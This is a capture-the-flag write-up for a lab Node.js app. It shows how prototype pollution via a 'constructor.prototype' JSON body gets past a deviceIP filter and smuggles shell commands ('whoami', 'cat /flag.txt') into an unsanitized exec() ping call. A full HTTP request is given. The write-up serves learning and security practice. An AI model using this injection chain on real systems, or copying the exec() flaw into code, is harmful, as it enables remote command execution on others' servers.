In this example scenario we have a login portal where we can update our profile with an IP, this will allow us to perform a ping execution via /ping.

We can see that the **/ping** function performs a ping via **exec()** function and no sanitation in in place.
```
router.get("/ping", AuthMiddleware, async (req, res) => {
    try {
        const sessionCookie = req.cookies.session;
        const username = jwt.verify(sessionCookie, tokenKey).username;

        // create User object
        let userObject = new User(username);
        await userObject.init();

        if (!userObject.deviceIP) {
            return res.status(400).send(response("Please configure your device IP first!"));
        }

        exec(`ping -c 1 ${userObject.deviceIP}`, (error, stdout, stderr) => {
            return res.render("ping", { ping_result: stdout.replace(/\n/g, "<br/>") + stderr.replace(/\n/g, "<br/>") });
        });

    } 
    <SNIP>
});
```

But we can see that the that the **/update** function only allows alphanumeric chars and nothing more...
```
router.post("/update", AuthMiddleware, async (req, res) => {
    try {
        const sessionCookie = req.cookies.session;
        const username = jwt.verify(sessionCookie, tokenKey).username;

        // sanitize to avoid command injection
        if (req.body.deviceIP){
            if (req.body.deviceIP.match(/[^a-zA-Z0-9\.]/)) {
                return res.status(400).send(response("Invalid Characters in DeviceIP!"));
            }
        }

```

## How to bypass?
Checking the **/ping** function is clear that the **userObject** is used to check if the **deviceIP** is set and that might be a good candidate to be prototype polluted.
```
           if (!userObject.deviceIP) {
                return res.status(400).send(response("Please configure your device IP first!"));
            }		
```

1)Locally(testing only)
We can bypass the User class via 
```
User.prototype.deviceIP = "127.0.0.1; whoami"
Result of Ping:
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.071 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.071/0.071/0.071/0.000 ms
aleksandar
```

2)Remotely(black-box) 
(OBS: you need to do it with a new user generation...)
In this case we can't do same, we have to register a new username and login.
Click the **/update** function and pollute
Pollute the **/update** function via:
```
POST /update HTTP/1.1
Host: proto.htb
Content-Length: 48
Content-Type: application/json
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InB3biIsImlhdCI6MTY4MTA3MjgxMCwiZXhwIjoxNjgxMDc2NDEwfQ.q1dbloU9k06dAymKHXvMvVrpEeYWRXABx9sK7qG6CWg

{"constructor":{"prototype": {"deviceIP" :"127.0.0.1; cat /flag.txt"}}}
```
(Here we used another way to bypass the `__proto__` since it was blacklisted.
